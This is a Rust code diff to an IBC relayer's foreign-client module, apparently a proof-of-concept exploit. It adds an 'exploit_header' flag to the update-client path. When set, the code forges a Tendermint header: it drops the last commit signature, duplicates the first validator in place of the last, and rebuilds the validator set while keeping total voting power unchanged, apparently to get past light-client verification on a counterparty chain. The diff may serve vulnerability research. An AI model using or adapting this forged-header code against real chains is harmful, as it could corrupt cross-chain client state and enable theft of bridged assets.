@@ -936,7 +936,7 @@ impl<DstChain: ChainHandle, SrcChain: ChainHandle> ForeignClient<DstChain, SrcCh
         &self,
         target_height: Height,
     ) -> Result<Vec<Any>, ForeignClientError> {
-        self.wait_and_build_update_client_with_trusted(target_height, None)
+        self.wait_and_build_update_client_with_trusted(target_height, None, false)
     }
 
     /// Returns a trusted height that is lower than the target height, so
@@ -1140,6 +1140,7 @@ impl<DstChain: ChainHandle, SrcChain: ChainHandle> ForeignClient<DstChain, SrcCh
         &self,
         target_height: Height,
         trusted_height: Option<Height>,
+        exploit_header: bool,
     ) -> Result<Vec<Any>, ForeignClientError> {
         crate::time!(
             "wait_and_build_update_client_with_trusted",
@@ -1199,7 +1200,40 @@ impl<DstChain: ChainHandle, SrcChain: ChainHandle> ForeignClient<DstChain, SrcCh
             }
         }
 
-        let messages = self.build_update_client_with_trusted(target_height, trusted_height)?;
+        let mut messages = self.build_update_client_with_trusted(target_height, trusted_height)?;
+        if let Some(mut msg) = messages.pop() {
+            let any_header = AnyHeader::try_from(msg.header.clone()).unwrap();
+            let new_any_header = if let Some(mut tm_header) =
+                ibc_relayer_types::downcast!(any_header.clone() => AnyHeader::Tendermint)
+            {
+                info!("DEBUG: header {tm_header}");
+                let mut validators = tm_header.validator_set.validators().clone();
+                let len = validators.len();
+                if exploit_header && len > 1 {
+                    tm_header.signed_header.commit.signatures[len - 1] =
+                        tendermint::block::CommitSig::BlockIdFlagAbsent;
+
+                    validators.pop();
+                    validators.push(validators[0].clone());
+                    let tmp_validator_set = tendermint::validator::Set::new(
+                        validators,
+                        tm_header.validator_set.proposer().clone(),
+                    );
+                    // use proto not to change the total_voting_power
+                    let mut validator_set: tendermint_proto::types::ValidatorSet =
+                        tmp_validator_set.into();
+                    validator_set.total_voting_power =
+                        tm_header.validator_set.total_voting_power().into();
+                    tm_header.validator_set = validator_set.try_into().unwrap();
+                    info!("DEBUG: new header {tm_header}");
+                }
+                tm_header.into()
+            } else {
+                any_header
+            };
+            msg.header = new_any_header.into();
+            messages.push(msg);
+        }
 
         let encoded_messages = messages.into_iter().map(Msg::to_any).collect();
 
@@ -1328,7 +1362,7 @@ impl<DstChain: ChainHandle, SrcChain: ChainHandle> ForeignClient<DstChain, SrcCh
     }
 
     pub fn build_latest_update_client_and_send(&self) -> Result<Vec<IbcEvent>, ForeignClientError> {
-        self.build_update_client_and_send(QueryHeight::Latest, None)
+        self.build_update_client_and_send(QueryHeight::Latest, None, false)
     }
 
     #[instrument(
@@ -1341,6 +1375,7 @@ impl<DstChain: ChainHandle, SrcChain: ChainHandle> ForeignClient<DstChain, SrcCh
         &self,
         target_query_height: QueryHeight,
         trusted_height: Option<Height>,
+        exploit_header: bool,
     ) -> Result<Vec<IbcEvent>, ForeignClientError> {
         let target_height = match target_query_height {
             QueryHeight::Latest => self.src_chain.query_latest_height().map_err(|e| {
@@ -1353,8 +1388,11 @@ impl<DstChain: ChainHandle, SrcChain: ChainHandle> ForeignClient<DstChain, SrcCh
             QueryHeight::Specific(height) => height,
         };
 
-        let new_msgs =
-            self.wait_and_build_update_client_with_trusted(target_height, trusted_height)?;
+        let new_msgs = self.wait_and_build_update_client_with_trusted(
+            target_height,
+            trusted_height,
+            exploit_header,
+        )?;
 
         if new_msgs.is_empty() {
             return Err(ForeignClientError::client_already_up_to_date(
